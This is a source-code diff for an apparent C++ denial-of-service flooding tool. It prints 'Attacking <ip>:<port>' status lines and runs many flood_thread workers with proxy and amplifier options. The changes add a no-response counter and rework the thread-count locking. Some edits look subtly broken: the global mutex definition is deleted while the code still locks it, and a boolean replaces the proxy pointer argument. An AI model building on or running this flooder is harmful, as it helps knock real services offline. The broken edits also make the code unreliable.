@@ -30,7 +30,8 @@
              " --version|-v                   print version info" COLOR_RESET "\n"
 
 #define REPORT_FMT COLOR_RESET "Attacking " COLOR_INTENSE COLOR_BLUE "%s" COLOR_WHITE ":" COLOR_YELLOW "%hu" COLOR_RESET " | method " COLOR_MAGENTA \
-        "%s" COLOR_RESET " | sent " COLOR_GREEN "%d" COLOR_RESET " | failed " COLOR_RED "%d" COLOR_RESET " | running threads %d\n"
+        "%s" COLOR_RESET " | sent " COLOR_GREEN "%d" COLOR_RESET " | failed " COLOR_RED "%d" COLOR_RESET " | noresponse " COLOR_YELLOW "%d" COLOR_RESET \
+        " | running threads %d\n"
 
 #define HUGE_BUFFER_FMT COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't allocate buffer of size = %lu. Maximum size is %lu." COLOR_RESET
 #define COULDNT_OPEN_FILE_FMT COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't open file \"%s\" : %s - %s" COLOR_RESET
@@ -40,6 +41,7 @@ static const char* send_data = nullptr;
 static int running_threads = 0;
 static int sent_requests = 0;
 static int failed_requests = 0;
+static int failed_reads = 0;
 static size_t amplifier = 0;
 static std::string method;
 static bool debug = false;
@@ -49,7 +51,6 @@ static net::inet_address* proxy_address = nullptr;
 static int proxy_type = PROXYSOCKET_TYPE_NONE;
 static const char* proxy_user = "";
 static const char* proxy_password = "";
-pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 static constexpr const char* s_options = "m:t:T:a:d:Dp:s:";
 const option l_options[]{
@@ -101,10 +102,19 @@ void* flood_thread(void*)
 					proxy_address, proxy_type, proxy_user, proxy_password, debug
 			);
 			::pthread_mutex_lock(&mutex);
-			if (flood)
+			if (flood == 1)
+			{
 				++sent_requests;
+			}
+			else if (flood == 2)
+			{
+				++sent_requests;
+				++failed_reads;
+			}
 			else
+			{
 				++failed_requests;
+			}
 			::pthread_mutex_unlock(&mutex);
 		}
 	}
@@ -210,7 +220,7 @@ int main(int argc, char** argv)
 	
 	if (!target_address_str.empty())
 	{
-		target_address = new net::inet_address(target_address_str, proxy_address);
+		target_address = new net::inet_address(target_address_str, proxy_address == nullptr);
 	}
 	
 	if (debug)
@@ -234,7 +244,7 @@ int main(int argc, char** argv)
 					size_t read = ::fread(data, sizeof(char), st.st_size, file);
 					data[read] = 0;
 					std::cout << COLOR_GREEN << "Successfully read Data from file \"" << data_file << "\"." COLOR_RESET "\n";
-					std::cout << COLOR_MAGENTA "Data = R\"(" COLOR_BLUE << data << COLOR_MAGENTA ")\"\n";
+					std::cout << COLOR_MAGENTA "Data = R\"(" COLOR_BLUE << data << COLOR_MAGENTA ")\"" COLOR_RESET "\n";
 				}
 				else
 				{
@@ -255,7 +265,9 @@ int main(int argc, char** argv)
 		
 		for (size_t i = 0; i < threads_count; ++i)
 		{
+			::pthread_mutex_lock(&mutex);
 			++running_threads;
+			::pthread_mutex_unlock(&mutex);
 			pthread_t thread;
 			::pthread_create(&thread, nullptr, flood_thread, nullptr);
 			::pthread_detach(thread);
@@ -265,14 +277,16 @@ int main(int argc, char** argv)
 		{
 			::printf(
 					REPORT_FMT,
-					target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
+					target_address->get_ip().c_str(), target_address->get_port(), method.c_str(),
+					sent_requests, failed_requests, failed_reads, running_threads
 			);
 			::sleep(1);
 			::srandom(::clock());
 		}
 		::printf(
 				REPORT_FMT,
-				target_address->get_ip().c_str(), target_address->get_port(), method.c_str(), sent_requests, failed_requests, running_threads
+				target_address->get_ip().c_str(), target_address->get_port(), method.c_str(),
+				sent_requests, failed_requests, failed_reads, running_threads
 		);
 		::exit(0);
 	}
